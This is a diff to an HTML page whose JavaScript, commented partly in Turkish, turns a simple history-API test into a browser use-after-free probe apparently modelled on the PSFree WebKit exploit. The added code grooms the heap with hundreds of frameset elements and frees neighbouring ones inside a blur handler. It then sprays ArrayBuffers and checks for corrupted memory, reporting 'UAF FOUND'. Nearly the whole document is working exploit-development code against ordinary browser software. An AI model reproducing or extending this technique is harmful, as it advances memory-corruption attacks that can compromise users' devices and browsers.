@@ -1,28 +1,64 @@
 <!DOCTYPE html>
 <html><body>
-<h1 id="s">Testing...</h1>
+<div id="log"></div>
 <script>
-// SSV allocation test
-history.replaceState("dummy", "");
-history.pushState({x: new Array(1000).fill(1.1)}, "", "#test1");
-history.pushState({x: new Array(1000).fill(1.1)}, "", "#test2");
+function log(s) {
+  document.getElementById('log').innerHTML += s + '<br>';
+}
 
-var input = document.createElement("input");
+// PSFree'nin frameset grooming tekniği
+const ssv_len = 0x50;
+const rows = ",".repeat(ssv_len / 8 - 2);
+
+history.replaceState("s0", "");
+history.pushState("s1", "", "#a");
+history.pushState("s1", "", "#b");
+history.pushState("s2", "");
+
+const fsets = [];
+for (let i = 0; i < 0x200; i++) {
+  const f = document.createElement("frameset");
+  f.rows = rows;
+  f.cols = rows;
+  fsets.push(f);
+}
+
+const input = document.createElement("input");
 document.body.appendChild(input);
 
-var blurCount = 0;
+let step = 0;
 input.addEventListener("blur", function() {
-  blurCount++;
-  document.getElementById('s').textContent = 
-    'blur fired: ' + blurCount + ' | state: ' + JSON.stringify(history.state);
+  log("blur step: " + step);
+  // Free neighbors — PSFree'nin exact tekniği
+  for (let i = 0x100 - 4; i < 0x100 + 4; i++) {
+    fsets[i].rows = "";
+    fsets[i].cols = "";
+  }
+  // Spray
+  const views = [];
+  for (let i = 0; i < 0x300; i++) {
+    const v = new Uint8Array(new ArrayBuffer(ssv_len));
+    v[0] = 0x41;
+    views.push(v);
+  }
+  // UAF kontrol
+  let found = false;
+  for (let i = 0; i < views.length; i++) {
+    if (views[i][0] !== 0x41) {
+      log("✅ UAF FOUND at view[" + i + "] = " + views[i][0]);
+      found = true;
+    }
+  }
+  if (!found) log("no UAF — v:" + views[0][0]);
+  step++;
+});
+
+document.addEventListener("popstate", function(e) {
+  log("pop: " + JSON.stringify(e.state));
 });
 
 input.addEventListener("focus", function() {
   history.back();
-});
-
-document.addEventListener("popstate", function(e) {
-  document.getElementById('s').textContent += ' | pop: ' + JSON.stringify(e.state).substring(0,50);
 });
 
 input.focus();
